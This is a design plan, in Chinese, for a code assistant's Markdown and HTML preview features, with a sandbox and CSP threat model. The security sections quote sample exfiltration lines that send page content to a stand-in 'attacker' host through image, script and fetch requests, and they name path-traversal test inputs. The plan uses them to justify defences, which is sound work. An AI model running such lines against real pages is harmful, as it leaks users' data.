# Phase 4 — Markdown Data Layer + Artifact Presentation Layer

> 创建时间：2026-05-11
> 最后更新：2026-05-12

> **协作边界（2026-05-12 起强制执行）**：Codex 只负责计划制定、方案审查、验收清单和 review；除非用户明确重新授权，Codex 不再改业务代码。ClaudeCode 负责执行代码改动、跑测试、整理提交。任何实现细节先写入本计划，再由 ClaudeCode 一次性执行，避免两边上下文漂移。

## 状态

| Phase | 内容 | 状态 | 备注 |
|-------|------|------|------|
| Phase 0 | 现状验证与约束确认 | ✅ 已完成 | 复现外部 Markdown 被 workspace scope 拦截；确认本工作区 Markdown 预览可用；确认 inline HTML sandbox 过严 |
| Phase 1 | Markdown 文件打开与安全授权模型 + 预览刷新 | ✅ 已完成（2026-05-11） | trust tier + agent-referenced 确认卡 + codepilot:file-changed 自动刷新 + 编辑冲突保护 |
| Phase 1.5 | HTML 同源预览路由 + 相对资源解析 + Interactive 沙箱开关 + 远端静态资源策略 + 依赖刷新 + CSP egress + URL-shaped 通道锁紧 | ✅ 已完成（2026-05-11） | iframe `src=/api/files/html-preview/[scope]/...`；本地相对 css/img/script 走同一路由按 scope 解析；CSP 从 `default-src 'none'` 起步；Static 放 `https:` 给 img/style/font/media，`script-src 'none'`；Interactive 撤销所有 `https:`（包括 script/img/style/font/media）只留 `'self' data: blob:`；两档都强制 `connect/frame/object/worker-src 'none'`；header 永久显示模式徽章；workspace HTML 用 baseDir、user-selected 外部 HTML 用 dirname 作为 sibling 资源刷新 scope；命中时通过 reload nonce 触发 iframe 重 fetch |
| Phase 2 | Markdown 作为数据：结构化阅读与交互 | ✅ 已完成（2026-05-12） | frontmatter、wikilinks、callouts、heading anchors、选区加入对话 |
| Phase 3 | Artifact 侧栏与代码块富预览 | ✅ 已完成（2026-05-12） | code-fence Preview action + HTML/JSX/JSON/Diff/CSV/Markdown routing |
| Phase 4 | Markdown → HTML 表现层导出 | ✅ 已完成（2026-05-12） | Markdown rendered view 默认 Article；样式 Select 原地切换；quiet refresh。HTML 显式保存入口 **deferred**（helpers 保留，见 tech-debt #18） |
| Phase 5 | 工程输出格式适配 / Dev-output references | ✅ 已完成（2026-05-12） | 本地文件链接、line fragment、diff/patch、localhost URL chip、HTML 预览入口 |

## 产品判断

Markdown 已经是 AI 时代文本内容和本地记忆的事实基准。CodePilot 不能只把它当普通文本编辑器处理，而应该把 Markdown 当作稳定、可版本控制、可被 AI 消费的数据层。

HTML / Artifact 则承担表现层：更高密度的信息布局、更丰富的交互和更顺滑的分享。它们不应取代 Markdown 作为事实源，因为 HTML 混入结构、样式和脚本后会污染 diff、浪费 token，也不适合长期记忆。

所以 Phase 4 的核心架构是：

| 层级 | 职责 | 存储与交互原则 |
|------|------|----------------|
| Markdown | 数据、事实、记忆、版本控制 | 保持纯净文本；支持 Obsidian 风格文件夹、链接、frontmatter、callout；AI 读取优先用 Markdown |
| Artifact / HTML | 展示、演示、交互、分享 | 从 Markdown 或代码块派生；可刷新、导出、分享；不作为主要事实源写回 |
| CodePilot UI | 把两层连接起来 | 用户可以从 Markdown 生成 Artifact，也可以从 Artifact 回到源 Markdown |

## Phase 0 现状验证

### 已验证事实

1. 当前工作区内 Markdown 可打开。
   - 在 `http://127.0.0.1:3001/chat/...` 打开文件树，点击 `README.ai.md` 后，中间 `PreviewPanel` 正常显示 Markdown 渲染和编辑/预览切换。
2. 非当前工作目录 Markdown 被 UI 路径挡住。
   - `/api/files/preview?path=/Users/op7418/Documents/code/资料/openclaw/README.md&baseDir=/Users/op7418/Documents/code/opus-4.6-test` 返回 403 `File is outside the project scope`。
   - 同一路径不带 `baseDir` 可以返回 200，说明后端不是完全不能读，而是 UI 的 `PreviewSource` 没有表达“用户授权打开的外部文件”。
3. Artifact 基础设施部分存在但没有形成统一体验。
   - `PreviewPanel` 已有 `inline-html` / `inline-jsx` / `inline-datatable` 数据通道。
   - `DiffSummary` 已用 `Artifact` 卡片展示 previewable 文件。
   - 消息代码块默认 header 只有 Copy / Copy as Markdown，没有 “Open in Artifact / Preview”。
4. HTML iframe 现在是最严格 sandbox。
   - `InlineHtmlView` 使用 `sandbox=""`，脚本、表单、弹窗、同源能力全禁。安全但会让一部分网页类 Artifact 和外部资源型 demo 看起来“坏掉”。
5. 打开的 Markdown 预览不会跟随 AI 文件改动自动刷新。
   - 用户如果一边开着 Markdown 预览，一边让 AI 修改该 Markdown，`PreviewPanel` 仍显示旧内容，需要关闭/重新打开才会重新 fetch。
   - 这会破坏 Phase 4 的核心假设：Markdown 是当前事实源，预览必须反映最新磁盘内容。

### 参考信息

- Vercel AI Elements `Artifact` 是容器 UI 壳，负责标题、内容和 actions，不负责具体渲染。真正的网页/JSX能力要配 `Web Preview`、`JSX Preview` 或自建 iframe/Sandpack。
- E2B Fragments 的定位是完整 AI 生成 app 沙箱，支持包安装和多栈运行。它适合后续“真执行项目级 Artifact”，不是 Phase 4 第一刀。
- 工程终端 / CLI 工具的 Markdown renderer 对本地文件链接有一个值得借鉴的原则：本地路径链接显示真实目标，并根据 cwd 缩短展示，同时规范化 `#L...` line fragment。
- 旧研究文档 `docs/research/craft-agents-markdown-internals.md` 已证明 Craft 的实用路线是 “Markdown language routing = 轻量 Artifact”：例如 `html-preview`、`datatable`、`diff`、`json` 等代码块直接渲染为富块。

## Phase 1 — Markdown 文件打开与安全授权模型

目标：用户可以打开任意自己选择的 Markdown 文件，即使它不在当前工作目录下；但 AI 输出的任意路径不能绕过授权读取用户磁盘。

### 设计

扩展 `PreviewSource`：

```ts
type PreviewTrust = 'workspace' | 'user-selected' | 'agent-referenced';

type PreviewSource =
  | {
      kind: 'file';
      filePath: string;
      baseDir?: string | null;
      trust?: PreviewTrust;
      readonly?: boolean;
      line?: number;
      column?: number;
    }
  | ...
```

规则：

1. `workspace`：现有行为，带 `baseDir=workingDirectory`，允许读写工作区文件。
2. `user-selected`：用户通过文件选择器、最近文件、显式外部路径按钮打开。允许读，默认只读；写入需要二次确认。
3. `agent-referenced`：AI / tool 输出中发现的外部路径。先展示“打开外部 Markdown?”确认卡，用户确认后转成 `user-selected`。

### 改动点

- `src/hooks/usePanel.ts`：扩展 `PreviewSource.file` 形态。
- `src/components/layout/panels/PreviewPanel.tsx`：fetch 时根据 `trust/baseDir` 决定是否传 `baseDir`。
- `src/app/api/files/preview/route.ts`：保留 workspace 403；新增明确的 `scope=user-selected` 或 `baseDir` 缺省路径合同，避免语义靠“没传 baseDir”偶然成立。
- `src/components/layout/panels/FileTreePanel.tsx`：工作区内仍走 `workspace`。
- 聊天消息文件链接 / DiffSummary：外部路径走 `agent-referenced`，不直接读取。

### 验收

- 从工作区文件树打开 `README.ai.md` 仍正常。
- 打开 `/Users/op7418/Documents/code/资料/openclaw/README.md` 成功，且 UI 标记为“外部文件 / 只读”。
- AI 消息里出现 `/Users/.../README.md` 时，用户未确认前不发起文件读取。
- symlink escape 仍被挡住。
- 打开某个 Markdown 文件后，让 AI 修改同一个文件；流结束或文件写入事件到达后，PreviewPanel 自动刷新到最新内容。
- 如果用户正在编辑该 Markdown 且有未保存修改，不自动覆盖编辑缓冲；改为显示“磁盘已更新，点击重新载入 / 保留我的编辑”的冲突提示。

### 预览刷新设计

新增一个轻量的文件变更事件通道，先不引入全量文件 watcher：

1. `MessageItem` 已经从 assistant tool blocks 里解析出写入/编辑的文件列表。消息完成后，如果当前 turn 包含写入工具，派发 `codepilot:file-changed` 事件：
   ```ts
   window.dispatchEvent(new CustomEvent('codepilot:file-changed', {
     detail: { paths: modifiedFiles.map((f) => f.path), source: 'assistant-turn' },
   }));
   ```
2. `PreviewPanel` 监听该事件；如果当前 `previewSource.kind === 'file'` 且路径命中：
   - 没有 edit dirty：重新 fetch `/api/files/preview` 并保留当前 view mode / scroll anchor。
   - 有 edit dirty：不覆盖缓冲，显示冲突提示。
3. `/api/files/write` 的本地保存成功后也可以派发同一事件，保持“所有写路径都让预览知道”的统一合同。
4. 后续如果需要监听外部编辑器改动，再单独接 Electron/Node watcher；第一刀只处理 CodePilot 内部 AI/用户写入路径。

## Phase 1.5 — HTML 同源预览路由 + 相对资源解析

> 完成：2026-05-11

### 根因

Phase 1 之前 HTML 预览走 `iframe srcDoc={content}`：iframe 文档的 effective URL = 父 app URL。HTML 里写的 `./style.css`、`<img src="./logo.png">`、`<script src="./bundle.js">` 全部相对父 app 路径解析，要么 404 要么命中无关路由，导致引用外部资源的网页在预览面板里**样式空白、图片裂、脚本不跑**。inline-html Artifact 也是同样的形态。

### 设计

新增同源预览路由 `/api/files/html-preview/[...segments]`：

1. URL 把 trust scope 编码进路径段（不是 query），browser-native 的相对解析会自动保持 scope：
   - `/api/files/html-preview/ws.<base64url(baseDir)>/<abs-path>` — workspace scope
   - `/api/files/html-preview/home/<abs-path>` — home scope（user-selected 外部文件）
2. iframe 直接 `src=<route-url>`；浏览器解析 `./style.css` 时自动产生 `/api/files/html-preview/<same-scope>/<sibling-path>`，路由读到 scope 段后用 `assertRealPathInBase` 在 scope 边界内做 realpath / symlink check 再返回文件。
3. agent-referenced 永远不构造 URL：Phase 1 的确认卡仍是入口，未确认前不发起任何 fetch。
4. 没有 file 来源的 inline-html 继续走 strict srcDoc：scope 不存在就不假装能解析外部资源。

scope token 不允许：根目录、未知前缀、`ws.` 之后空 payload、payload 非 POSIX 绝对路径。任何一项命中 → 400/403。

### 沙箱分层（默认安全）

两层屏障：iframe sandbox（主屏障，控执行能力）+ 路由 CSP（防御深度，控网络策略）。两层都按 Static / Interactive 切：

| 模式 | iframe sandbox | 路由 CSP（脚本） | 路由 CSP（图/样/字/媒体） | 路由 CSP（egress） | 何时使用 |
|------|----------------|------------------|--------------------------|---------------------|----------|
| Static（默认） | `sandbox=""` | `script-src 'none'` | `'self' data: blob: https:`（含远端 CDN） | `connect/frame/object/worker/manifest/child-src 'none'` | 所有 HTML 文件预览初始状态。脚本不会执行；hard-coded https CDN 资源允许加载（脚本不能动态构造 URL，外联范围被作者锁定） |
| Interactive | `sandbox="allow-scripts allow-forms"` | `script-src 'self' 'unsafe-inline' 'unsafe-eval'`（无 https） | `'self' data: blob:`（无 https） | 同上（egress 一律 'none'） | 用户显式点击「启用脚本」后；iframe origin 仍 null（永不加 `allow-same-origin`），且**所有 https 外部资源在交互模式下被屏蔽** |

切换文件自动重置 Interactive 为 off；脚本授权是 per-source 决定，不会跨文件继承。

CSP 从 **`default-src 'none'`** 开始，每个允许方向显式列出。Round 3 关键改动：堵住未列出 directive fall-through 到默认源的漏洞，把 `connect/frame/object/worker/manifest-src` 全部钉死 `'none'`（fetch / nested iframe / Worker 都不能外联）。Round 4 关键改动：发现 Round 3 仍留有 URL-shaped 通道——interactive 模式下脚本可以 `new Image().src = 'https://attacker/?d=' + outerHTML` / `<link rel="stylesheet" href="https://attacker/...">` / `<script src="https://attacker/...">`，这些不走 connect-src，走的是 img/style/script-src 的 https。Round 4 把 interactive 模式下所有资源 directive 的 `https:` 也一并撤销，只留 `'self' data: blob:`。

产品取舍：在 Static 模式下用 Tailwind CDN / Google Fonts / 外站图片的页面能正常显示；切到 Interactive 后这些 CDN 资源会立刻断（因为撤销了 https）。**「让脚本运行」和「让外部网络资源加载」被切成两个独立的信任决定**——未来要支持「我允许脚本，也允许它访问 CDN」需要单独 UI 授权，不在「启用脚本」这个开关里默认捎带。

路由通过 query `?interactive=1` 选择 CSP（仅 document 响应需要带；subresource 请求不需要，浏览器只按 document 的 CSP 执行子资源加载约束）。

### Blocked-resource 反馈

PreviewPanel 头部 HTML 预览时**永久显示当前模式徽章**：

- Static 模式：`静态 · 脚本禁用` （灰色 chip）+ 「启用脚本」按钮
- Interactive 模式：`交互 · 沙箱脚本` （橙色 chip）+ 「已启用脚本」按钮

徽章 tooltip 说明加载策略；用户切换文件 → 自动复位为 Static。这是 spec 要求的「PreviewPanel header 中明确 blocked resource 提示，不依赖 console」—— 通过 always-visible 模式标签实现，比 per-resource 错误更稳定（跨 origin iframe 的 console 我们也读不到）。

### 依赖资源刷新

当前预览是 HTML 且 `htmlPreviewUrl` 存在时，`codepilot:file-changed` 事件不止匹配 `filePath` 本身，还会用 `shouldReloadHtmlForPath(p, activeHtmlPath, htmlDepScope)` 判断 sibling：

- 路径必须在 `htmlDepScope` 下：
  - **workspace HTML** → scope = workspace baseDir（项目根整个目录树都算依赖范围）
  - **user-selected 外部 HTML** → scope = 当前 HTML 文件所在目录（`htmlPreviewDirname`）；user-selected 没有 baseDir，若仍按 baseDir 判定就会漏掉所有外部 HTML 的依赖刷新（Round 2 的盲点，Round 3 补上）
- 扩展名必须是静态资源族（css / js / mjs / png / jpg / svg / webp / woff2 / html / ... 见 `HTML_DEP_EXTENSIONS`）

命中时 → `reloadTick++` → `htmlPreviewUrl` 拼上新的 `?_t=N` → iframe `src` 变化 → 浏览器重新拉 document + 所有 subresource，用户看到的网页样式 / 图片立刻刷新。仅刷新 `/api/files/preview` 不够 —— iframe `src` 不变浏览器不会重新跑 subresource。

Markdown 等编辑型文件不在 HTML 依赖判定路径里，dirty buffer 冲突保护逻辑保持原样。

### 路由其他 headers

`Content-Type` 按扩展名映射；`X-Content-Type-Options: nosniff` + `Cache-Control: no-store` + `Referrer-Policy: no-referrer` 始终带上。HTML 响应额外带 `X-Frame-Options: SAMEORIGIN`。

### 改动点

- `src/lib/html-preview-url.ts`（新）— `buildHtmlPreviewUrl` / `parseHtmlPreviewSegments`，path-segment scope 编码。
- `src/app/api/files/html-preview/[...segments]/route.ts`（新）— 路由实现 + realpath 边界检查 + MIME 映射 + CSP/nosniff/no-store headers。
- `src/components/layout/panels/PreviewPanel.tsx` — HTML 文件 rendered 分支：iframe `src=htmlPreviewUrl` 替代 `srcDoc=content`；新增 `interactiveScripts` state；Header 增加「启用脚本/已启用脚本」toggle，仅在 HTML 文件 + 路由 URL 可用 + rendered 视图时出现；切文件自动重置。
- `src/i18n/zh.ts` / `en.ts` — `filePreview.interactive.{enable,disable,enableTooltip,disableTooltip}`。

### 验收

1. 工作区 HTML 文件 `./style.css` 和 `./assets/logo.png` 正常加载，预览样式 / 图片可见。
2. `../outside/secret.txt` 类逃逸资源被 route 用 `assertRealPathInBase` 拒掉（403 `symlink_escape`）。
3. symlink 指向 scope 外的真实路径也被 realpath check 拒掉。
4. agent-referenced 外部 HTML 未确认前不构造 route URL，也不发起 fetch；用户确认后 → user-selected + readonly + home scope route 正常加载。
5. inline-html 无来源时仍走 srcDoc strict sandbox。
6. 点击「启用脚本」后 sandbox 变为 `allow-scripts allow-forms`，但永远不带 `allow-same-origin`；脚本可执行，无法访问主程序状态；切文件自动复位。
7. CSP 分层验证（Round 4 后）：
   - Static 模式响应包含 `img-src https:` / `style-src https:` / `font-src https:` / `media-src https:` 同时 `script-src 'none'`。
   - Interactive 模式 `script-src` 是 `'self' 'unsafe-inline' 'unsafe-eval'`（**不含 https**），且 `img-src` / `style-src` / `font-src` / `media-src` 也**不含 https**，只保留 `'self' data: blob:`（脚本不能通过 `<img>`/`<link>`/`<script>` 等 URL-shaped 方式向外发请求）。
   - 两档模式下 `connect-src` / `frame-src` / `object-src` / `worker-src` / `manifest-src` 全部 `'none'`，`frame-ancestors 'self'` / `form-action 'none'` 永远不放宽。
8. Header 上的模式徽章一直可见：Static 灰 chip + 「启用脚本」按钮；Interactive 橙 chip + 「已启用脚本」按钮；切文件回到 Static。
9. 依赖刷新：打开 `index.html` 时编辑 `./style.css` 或 `./assets/logo.svg`，iframe `src` 拼上新的 `?_t=N` 自动重 fetch；编辑 `../etc/passwd.css` 类越界路径或 `.md` / `.json` 等非静态扩展时不会触发刷新。Markdown buffer dirty + 同一 .md 文件被外部改写仍走冲突横幅，不被 HTML 路径影响。
10. user-selected 外部 HTML 也走依赖刷新：以 active HTML 文件所在目录作为 scope floor；编辑同目录 / 子目录下的 `.css` / `.svg` 会触发 reload nonce，但编辑该目录外的同名 `.css` 不会。
11. CSP 抗外传：路由 CSP 包含 `default-src 'none'` + 显式 `connect-src 'none'` + `frame-src 'none'` + `object-src 'none'` + `worker-src 'none'` + `manifest-src 'none'`，两档模式都带。
12. Interactive 模式额外锁紧 URL-shaped 通道：`script-src` / `img-src` / `style-src` / `font-src` / `media-src` 全部撤销 `https:`，只保留 `'self' data: blob:` —— 脚本可执行但无法通过 `<img>` / `<link>` / `<script>` / `new Image()` 把内容塞进 URL 外发。

### 仍不做

- 不做 base tag 注入式重写（脆弱、与现有 `<base>` 冲突、URL 编码坑）。
- 不做 cookie-bound session token（保持 stateless 路由）。
- 不做 cross-origin server-served HTML（如 e2b/StackBlitz）—— 那是 Phase 4 之外的"真执行"路径。
- 不在 route 层做 HTML 内容重写或脚本剥离 —— 沙箱已经把执行能力收住。
- 不做 per-resource blocked banner（要跨 origin 抓 iframe console，做不可靠；模式徽章已经把策略明示给用户）。
- 不开放 `http://` 远端资源（混入会让 mixed-content / 明文请求侥幸通过）—— `https:` 是远端资源的下限。
- 不放开 `frame-ancestors` / `form-action`—— 这两个在 Static / Interactive 两档下都保持 `'self'` / `'none'`，避免被嵌入到第三方页面或被诱导提交表单到非授权端点。
- Windows 路径目前以 POSIX 为主；混合分隔符走 `path.resolve()` 兜底，但不保证 Windows 下复杂 case，等真有 Windows 用户反馈再单独看。

## Phase 2 — Markdown 作为数据的阅读与交互

目标：Markdown 不只是“预览一大段文本”，而是变成可导航、可引用、可被 AI 局部消费的数据结构。

### 第一批能力

1. Outline rail：按 heading 生成右侧小目录，点击跳转。
2. Heading anchor：支持 `#heading` / `#L12` / `:12` 进入指定位置。
3. Frontmatter panel：展示 YAML frontmatter，后续可作为 AI metadata。
4. Obsidian compatibility v1：
   - `[[wikilink]]` 渲染为本地文件链接。
   - `> [!note]` / `> [!warning]` callout 基础渲染。
   - 不做 WYSIWYG 互转，保留 Markdown 原文。
5. 选区引用到聊天：用户选中一个 heading/段落后可 “Add to chat”，消息里保留文件路径 + heading/line metadata。

### 不做

- 不把 Markdown 转成私有 JSON 存储。
- 不引入 Tiptap 作为主编辑器。
- 不做完整 Obsidian vault 索引器；只做当前打开文件和显式链接的轻量体验。

## Phase 3 — Artifact 侧栏与代码块富预览

目标：让 AI 生成的可展示内容不再只停留在 Markdown 代码块里，而是可以一键进入侧边 Artifact。

### 设计

1. `PreviewPanel` 外壳改用 AI Elements `Artifact` primitives：
   - Header：标题、来源路径/虚拟文件名、模式切换。
   - Actions：复制、下载、刷新、外部打开、导出长图。
   - Content：交给 Markdown/HTML/Sandpack/DataTable 等具体 renderer。
2. 消息代码块 header 增加 `Preview` action：
   - `html` / `html-preview` → `inline-html`
   - `jsx` / `tsx` → `inline-jsx`
   - `json` → JSON tree / source
   - `diff` → diff viewer
   - `csv` / `datatable` → `inline-datatable`
3. Language routing 采用 Craft 风格：
   - AI 可以输出标准 Markdown code fence。
   - UI 根据 language 自动提供富预览入口。
   - 纯 Markdown 读者仍能看到原代码块，降级良好。

### HTML sandbox 分层

| 模式 | 用途 | iframe 策略 |
|------|------|-------------|
| Static | 纯文档 / CSS / SVG | `sandbox=""`，现有最安全路径 |
| Interactive | 用户明确点击“允许交互” | `allow-scripts allow-forms allow-popups-by-user-activation`，不加 `allow-same-origin` |
| External URL | 已部署网页 / 外部资源页 | 使用 WebPreview/iframe URL，清晰标注外部站点 |

默认仍安全，交互能力必须由用户动作打开。不要为了“网页能跑”直接把所有 inline HTML 放宽。

### 验收

- AI 生成 ` ```html` 代码块后，header 出现 Preview 按钮；点击打开 Artifact 面板。
- 静态 HTML 默认安全渲染；包含脚本的 HTML 默认不执行，并提示可切到交互模式。
- JSX/TSX 仍走 Sandpack allowlist，不污染主页面。
- DiffSummary 文件卡和代码块 Artifact 使用同一套视觉语言。

## Phase 4 — Markdown 到 HTML 的表现层导出

目标：把 Markdown 作为源数据，用可审阅、可版本控制的 `.md` 生成高密度 HTML 表现，而不是要求用户手写 HTML。

### 第一版能力

1. Markdown rendered view 默认使用 Article 样式打开，不再要求用户先点击“生成”。
2. Header 内提供 Select：Default / Article / Report / Brief / Pitch，直接切换 CSS 表现，不弹窗、不新开 tab。
3. Workspace Markdown 的“保存 HTML”动作 **deferred**：
   - 第一轮实现落在 PreviewPanel 头部 + `<workspace>/.codepilot/artifacts/<slug>.html`，用户两轮直接反馈"为啥有这个选项"。
   - 产品判断：路径错位（隐藏目录 + slug 丢原名）、header 已拥挤、Style Select 已经让用户看到 HTML 形态。"保存一份到磁盘"是独立的导出需求，不属于 Markdown 默认头部 affordance。
   - Helpers（`buildPresentationArtifactPath` / `slugifyPresentationArtifactName` / `presentationStyleToTemplateId`）保留 + 单测覆盖，作为未来 Export pipeline 的脚手架，零运行成本。
   - 重启条件：真实用户分享 MD 需求 / 独立 Export menu 立项。见 tech-debt-tracker #18。
4. 外部 user-selected Markdown 仍是只读预览，不自动写回外部目录；需要保存时先复制 / 移入 workspace。
5. 旧 inline-html source backlink refresh 保留用于兼容历史 artifact，但新的默认路径是“Markdown 文件 + in-place 样式”。

### 不做

- 不把生成的 HTML 再喂回 AI 当事实源。
- 不做完整发布平台 / S3 上传；只留接口位。

## Phase 5 — 工程输出格式适配 / Dev-output references

目标：让工程聊天里常见的输出格式在 CodePilot 里自然打开 Markdown、diff、HTML，而不是停留在文本。这里只处理"AI 在聊天里发了什么样式的引用"这一层，**不**对应任何 Runtime / Local Agent 接入；本地 Agent / Codex Runtime 是后续独立 Phase。

### 适配点

1. 本地文件链接：
   - 支持 `/abs/path/file.md:12`、`file.md#L12`、`[label](/abs/path/file.md:12)`。
   - 展示时遵循工程 CLI/TUI 的本地链接习惯：显示真实目标，绝对路径可按 session cwd 缩短。
2. Patch / diff：
   - ` ```diff` 自动给 diff viewer / Artifact action。
   - 未来 review findings 可落成 inline code comments。
3. HTML preview：
   - AI 输出 `.html` 文件路径时，显示 Artifact open action。
4. Browser preview：
   - 对 localhost URL 提供 “Open in Browser / Open in Artifact” 两个不同动作。

## 测试计划

| 类型 | 覆盖 |
|------|------|
| Unit | `PreviewSource` scope 合同、file preview API scope、Markdown link parser、HTML sandbox mode reducer |
| Contract grep | 消息代码块必须存在 Preview action；AI-referenced 外部路径不得直接调用 preview API |
| Browser smoke | 工作区 Markdown 打开；外部 Markdown 打开；html code block → Artifact；interactive HTML 二次确认 |
| Security | symlink escape、root baseDir、agent-referenced path 未确认不读取、interactive iframe 不加 same-origin |
| Build | `npm run test`、`npx next build`；涉及 UI 后用 Browser/CDP 截图 |

## 风险与降级

| 风险 | 降级 |
|------|------|
| 外部文件读取放太宽 | 只允许用户显式选择，AI 引用必须确认；默认只读 |
| HTML 交互放宽引入安全问题 | sandbox 分层，默认 static；interactive 不给 same-origin |
| Sandpack 体积/内存上升 | 继续 lazy load；JSX preview 只在点击后加载 |
| Markdown 结构解析影响长文档性能 | 先按当前打开文件局部解析 outline；不做全 vault 索引 |
| Artifact 与 PreviewPanel 双 UI 分裂 | PreviewPanel 统一用 Artifact primitives 包装，DiffSummary 和 code block 复用同一入口 |

## 决策日志

- 2026-05-11: Phase 4 不从“Markdown 编辑器”切入，而从“Markdown 数据层 + Artifact 表现层”切入。原因是用户明确要求跳出文本编辑器思路，且 CodePilot 的 memory / workspace 已经依赖 `.md` 文件。
- 2026-05-11: 外部 Markdown 采用授权模型而不是移除 `baseDir` 检查。实测后端不带 `baseDir` 可读 home 下文件，但 UI 不能让 AI 消息里的任意路径直接触发读取。
- 2026-05-11: Artifact 第一刀复用 AI Elements `Artifact` 作为外壳，自建具体 renderer。官方 Artifact 文档也定位为 generated content container，不是 HTML/JSX runtime。
- 2026-05-11: HTML sandbox 采用分层模式。现有 `sandbox=""` 安全但过严；Phase 4 允许用户显式开启 interactive mode，但不默认放宽。
- 2026-05-11: E2B Fragments 作为未来完整 app sandbox 参考，不进入 Phase 4 第一刀。当前目标是本地 Markdown/Artifact 体验，不是云端任意代码执行平台。
- 2026-05-11: Phase 1 实装 trust tier + 确认卡 + codepilot:file-changed 自动刷新 + 编辑冲突保护。MultiEdit 入 WRITE_TOOLS（漏掉会让 Claude Code 的主修改路径整体不发刷新事件）。openDynamicTab 同 id 复用必须**替换 metadata** 不只是激活，否则 agent-referenced → user-selected 升级无法持久化，刷新页面又要重新确认。
- 2026-05-11: HTML 外部资源问题升级为 Phase 1.5 独立 Step 而不是 deferred。选了 same-origin route + scope 编码进 path segment 的方案，理由：(a) `<base>` 注入与文件原 `<base>` 冲突且 URL 编码脆弱；(b) cookie-bound session 引入状态破坏路由 stateless 性；(c) path-segment scope token 让 browser-native relative resolution 自动保持 scope，路由侧靠 `assertRealPathInBase` 一处统一收口安全检查。脚本默认关，交互模式必须用户显式开启且永不放 `allow-same-origin`。inline-html 无来源继续 srcDoc strict sandbox，不假装能解析外部资源。
- 2026-05-11: Phase 1.5 第二轮补完。Round 1 只做了**本地相对资源**——远端 https CDN 静态资源会被 `default-src 'self' data: blob:` 静默挡掉，dep 资源变更也不刷新。Round 2：(a) 拆 CSP 为 Static / Interactive 两档：Static 放开 `https:` 给 img/style/font/media，`script-src 'none'`；Interactive 额外放开 `script-src https:`，sandbox 仍永不加 `allow-same-origin`；route 通过 `?interactive=1` 选档；切档触发 URL 变化自然 iframe reload。(b) PreviewPanel header 永久显示模式徽章 + tooltip 说明加载策略，作为 spec 要求的 blocked-resource 反馈（per-resource 错误跨 origin 取不到）。(c) `codepilot:file-changed` 监听对 HTML 预览扩展 sibling-dep 匹配：同 scope baseDir 下的静态资源族（`HTML_DEP_EXTENSIONS`）变更命中时 `reloadTick++` → URL 拼 `?_t=N` → iframe src 变化 → browser 重 fetch document + 所有 subresource。Markdown editor dirty 流程不受影响（HTML 没有编辑模式）。
- 2026-05-11: Phase 1.5 Round 3 安全锁紧 + 外部依赖修复。Round 2 的 CSP 仍用 `default-src 'self' data: blob: https:` 作为兜底，未列出的 `connect-src` / `frame-src` / `object-src` / `worker-src` / `manifest-src` 全部 fall through 到这一行，等于默默放开。复审指出在 Interactive 模式下脚本可以 `fetch('https://attacker', { body: outerHTML })` 把预览内容外传，iframe `allow-same-origin` 缺失只保护父程序的 cookie / API、不挡 iframe 自己往外发请求。Round 3：(a) CSP 改为 `default-src 'none'` + 每个允许方向显式列出；`connect-src 'none'` / `frame-src 'none'` / `object-src 'none'` / `worker-src 'none'` / `manifest-src 'none'` 两档都带，Interactive 只放开 `script-src`，**不放开任何 egress 方向**——未来要让脚本能联网必须走单独的 UI 授权流。(b) 修复 user-selected 外部 HTML 的依赖刷新：`sourceBaseDir` 在 user-selected 下是 undefined，shouldReloadHtmlForPath 直接 false，所有外部 HTML 的 sibling change 都被吃掉；改用 `htmlPreviewDirname(activeFilePath)` 作为 reload scope floor，覆盖同目录 + 子目录静态资源。
- 2026-05-12: Phase 2-5 主线实现并校正命名。Markdown 打开即使用 Article 样式；Select 直接切 Default / Article / Report / Brief / Pitch。工程输出格式适配只描述 path/line/diff/localhost 引用，不再写成 Codex Runtime / Local Agent 接入。
- 2026-05-12: **保存 HTML 入口 deferred**。第一轮实现落到 PreviewPanel 头部 + `.codepilot/artifacts/<slug>.html`，用户连续两次反馈反对。产品 review 结论：路径错位（隐藏目录 + slug 丢原名）、header 已拥挤、Style Select 已经让用户原地看到 HTML 形态；"保存一份到磁盘"属于导出需求，不是 Markdown 头部默认 affordance。helpers + 单测保留作未来 Export pipeline 脚手架；UI 入口（按钮 / handler / state / i18n key / 合同测试）移除。tech-debt-tracker #18 记录重启条件。
- 2026-05-11: Phase 1.5 Round 4 收紧 URL-shaped 外联通道。Round 3 关掉了 `connect-src`，但 Interactive 模式下脚本仍可以通过资源 directive 走 URL 外联：`new Image().src = 'https://attacker/?d=...'` / `document.head.appendChild(<link rel=stylesheet href=https://...>)` / `document.head.appendChild(<script src=https://...>)` 都是合法的 GET，URL 里塞 `outerHTML` 就能把预览内容回传给攻击者。这条路径不经过 connect-src，走 img/style/script-src 的 `https:`，因此 Round 3 拦不住。Round 4：Interactive 模式撤销 `script-src` / `img-src` / `style-src` / `font-src` / `media-src` 中的所有 `https:`，只保留 `'self' data: blob:`；Static 模式不动（无脚本，URL 在作者编写时锁定，CDN 资源继续工作）。产品语义切成两个独立信任决定：「让脚本运行」（Round 4 之后的 Interactive）和「让外部网络资源加载」（未来独立 UI 开关）。`enableTooltip` / `modeTooltip` 文案同步更新，明确告知用户启用脚本会同时关闭 CDN。
